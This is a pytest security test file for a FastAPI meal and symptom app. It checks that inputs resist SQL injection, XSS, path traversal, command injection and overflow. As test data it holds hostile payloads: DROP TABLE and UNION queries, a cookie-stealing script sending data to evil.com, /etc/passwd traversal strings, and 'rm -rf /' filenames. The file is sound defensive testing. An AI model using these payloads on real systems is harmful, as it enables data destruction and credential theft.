"""
Security tests for input validation.

Tests protection against:
- SQL injection
- XSS attacks
- Path traversal
- Command injection
"""
import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session
import json

from app.models import User, Ingredient
from tests.factories import create_user, create_meal, create_symptom


@pytest.mark.security
class TestSQLInjection:
    """Tests for SQL injection prevention."""

    def test_login_sql_injection_email(self, client: TestClient, db: Session):
        """Test SQL injection in login email field."""
        create_user(db, email="test@example.com", password="password123")

        # Common SQL injection payloads
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "admin'--",
            "1' OR '1'='1' --",
            "' UNION SELECT * FROM users --"
        ]

        for payload in payloads:
            response = client.post(
                "/auth/login",
                data={
                    "email": payload,
                    "password": "password123"
                },
                follow_redirects=False
            )

            # Should reject with redirect to login error, not succeed
            assert response.status_code == 303
            assert "error" in response.headers.get("location", "")

    def test_search_sql_injection(
        self, auth_client: TestClient, test_user: User
    ):
        """Test SQL injection in search/autocomplete."""
        payloads = [
            "'; DROP TABLE symptoms; --",
            "' OR 1=1 --",
            "' UNION SELECT password_hash FROM users --"
        ]

        for payload in payloads:
            response = auth_client.get(
                f"/symptoms/tags/autocomplete?q={payload}"
            )

            # Should not crash or expose data
            assert response.status_code in [200, 400, 422]

    def test_ingredient_name_sql_injection(
        self, auth_client: TestClient, test_user: User, db: Session
    ):
        """Test SQL injection in ingredient name."""
        meal = create_meal(db, test_user)

        payload = "Chicken'; DROP TABLE ingredients; --"

        response = auth_client.post(
            f"/meals/{meal.id}/ingredients/add",
            data={
                "ingredient_name": payload,
                "state": "cooked"
            }
        )

        # Should handle gracefully
        assert response.status_code in [200, 201, 303, 400]

        # Database should still work
        ingredients = db.query(Ingredient).all()
        assert db.is_active


@pytest.mark.security
class TestXSSPrevention:
    """Tests for XSS (Cross-Site Scripting) prevention."""

    def test_meal_name_xss(
        self, auth_client: TestClient, test_user: User, db: Session
    ):
        """Test XSS in meal name is escaped."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>"
        ]

        for payload in xss_payloads:
            meal = create_meal(db, test_user, name=payload)

            response = auth_client.get(f"/meals/{meal.id}/edit-ingredients")

            assert response.status_code == 200
            # Script tags should be escaped, not rendered as raw HTML
            assert "<script>alert" not in response.text
            # Check for HTML entity encoding
            assert "&lt;script&gt;" in response.text or payload not in response.text

    def test_symptom_notes_xss(
        self, auth_client: TestClient, test_user: User, db: Session
    ):
        """Test XSS in symptom notes is escaped."""
        payload = "<script>document.location='http://evil.com/?c='+document.cookie</script>"

        response = auth_client.post(
            "/symptoms/create",
            data={
                "description": "Test",
                "symptom_type": "digestive",
                "severity": 5,
                "notes": payload
            },
            follow_redirects=False
        )

        assert response.status_code == 303

        # View history to check escaping
        history = auth_client.get("/symptoms/history")
        assert "<script>" not in history.text

    def test_ingredient_name_xss(
        self, auth_client: TestClient, test_user: User, db: Session
    ):
        """Test XSS in ingredient name is escaped."""
        meal = create_meal(db, test_user)
        payload = "<img src=x onerror='alert(1)'>"

        auth_client.post(
            f"/meals/{meal.id}/ingredients/add",
            data={"ingredient_name": payload, "state": "raw"}
        )

        response = auth_client.get(f"/meals/{meal.id}/edit-ingredients")

        # Should be escaped
        assert "onerror=" not in response.text or "&" in response.text


@pytest.mark.security
class TestPathTraversal:
    """Tests for path traversal prevention."""

    def test_image_path_traversal(
        self, auth_client: TestClient, test_user: User, db: Session
    ):
        """Test path traversal in image paths."""
        meal = create_meal(db, test_user)

        # Try to access files outside upload directory
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "....//....//....//etc/passwd"
        ]

        for payload in traversal_payloads:
            # If there's an image view endpoint, test it
            response = auth_client.get(f"/uploads/{payload}")

            # Should not expose system files
            assert response.status_code in [400, 403, 404]
            assert "root:" not in response.text  # /etc/passwd content


@pytest.mark.security
class TestCommandInjection:
    """Tests for command injection prevention."""

    def test_filename_command_injection_on_create(
        self, auth_client: TestClient, test_user: User
    ):
        """Test command injection via filename during meal creation."""
        from io import BytesIO

        # Malicious filenames that might trigger command execution
        malicious_names = [
            "test; rm -rf /",
            "test`whoami`",
            "test$(cat /etc/passwd)",
            "test|cat /etc/passwd"
        ]

        for name in malicious_names:
            # Create a minimal valid JPEG
            from PIL import Image
            img = Image.new('RGB', (100, 100), color='red')
            buffer = BytesIO()
            img.save(buffer, format='JPEG')
            buffer.seek(0)

            response = auth_client.post(
                "/meals/create",
                files={"image": (name + ".jpg", buffer, "image/jpeg")},
                data={"user_notes": "Test meal"},
                follow_redirects=False
            )

            # Should handle safely without executing commands
            assert response.status_code in [200, 303, 400, 422, 500]


@pytest.mark.security
class TestJSONInjection:
    """Tests for JSON injection prevention."""

    def test_json_tags_injection(
        self, auth_client: TestClient, test_user: User
    ):
        """Test JSON injection in tags field."""
        # Try to inject additional JSON properties
        malicious_json = json.dumps([
            {"name": "test", "severity": 5, "user_id": 999}  # Try to change user
        ])

        response = auth_client.post(
            "/symptoms/create-tagged",
            data={"tags_json": malicious_json},
            follow_redirects=False
        )

        # Should succeed but ignore extra fields
        assert response.status_code in [303, 400]

    def test_nested_json_injection(
        self, auth_client: TestClient, test_user: User
    ):
        """Test deeply nested JSON."""
        # Very deep nesting might cause stack overflow
        deep_json = {"name": "test", "severity": 5}
        for _ in range(100):
            deep_json = {"nested": deep_json}

        response = auth_client.post(
            "/symptoms/tags/elaborate",
            json={"tags": [deep_json]}
        )

        # Should handle gracefully
        assert response.status_code in [200, 400, 422, 500]


@pytest.mark.security
class TestIntegerOverflow:
    """Tests for integer overflow prevention."""

    def test_severity_overflow(
        self, auth_client: TestClient, test_user: User
    ):
        """Test integer overflow in severity field."""
        overflow_values = [
            9999999999999999999,
            -9999999999999999999,
            2**63,
            -2**63
        ]

        for value in overflow_values:
            response = auth_client.post(
                "/symptoms/create",
                data={
                    "description": "Test",
                    "symptom_type": "digestive",
                    "severity": value
                },
                follow_redirects=False
            )

            # Should reject or handle gracefully
            assert response.status_code in [400, 422, 500]

    def test_id_overflow(
        self, auth_client: TestClient, test_user: User
    ):
        """Test integer overflow in ID parameters."""
        overflow_id = 9999999999999999999

        response = auth_client.get(f"/meals/{overflow_id}/edit-ingredients")

        # Should handle gracefully
        assert response.status_code in [400, 404, 422]
